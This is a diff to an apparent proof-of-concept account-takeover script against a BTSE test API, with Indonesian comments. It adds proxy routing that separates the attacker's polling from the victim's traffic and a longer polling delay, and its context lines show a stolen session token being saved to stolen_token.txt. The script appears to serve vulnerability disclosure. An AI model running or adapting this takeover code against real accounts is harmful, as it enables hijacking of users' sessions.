@@ -20,10 +20,22 @@ import json
 import sys
 import time
 import uuid
+import os
 import urllib.request
 import urllib.error
 
 BASE = "https://testapi.btse.io"
+# Split rate-limit buckets: attacker polling boleh direct (IP runner)
+# sementara app korban tetap via SG proxy. Kosong = direct.
+PROXY = os.environ.get("ATTACKER_PROXY", "").strip()
+
+
+def _opener():
+    if PROXY:
+        return urllib.request.build_opener(
+            urllib.request.ProxyHandler({"http": PROXY, "https": PROXY})
+        )
+    return urllib.request.build_opener()
 
 
 def raw(method, url, body=None, timeout=30):
@@ -31,8 +43,9 @@ def raw(method, url, body=None, timeout=30):
     req = urllib.request.Request(
         url, data=data, method=method, headers={"Content-Type": "application/json"}
     )
+    op = _opener()
     try:
-        with urllib.request.urlopen(req, timeout=timeout) as r:
+        with op.open(req, timeout=timeout) as r:
             return r.status, r.read().decode(errors="replace")
     except urllib.error.HTTPError as e:
         return e.code, e.read().decode(errors="replace")
@@ -125,7 +138,8 @@ def main():
             print("[ATO] disimpan -> stolen_token.txt")
             banner("POC SELESAI — token akun korban berada di kanal penyerang")
             return
-        time.sleep(2)
+        # backoff ringan utk hindari rate-limit testapi (status persist di server, tak lost)
+        time.sleep(4)
 
     banner("TIMEOUT (5 menit) — jalankan ulang untuk sessionId baru")
 
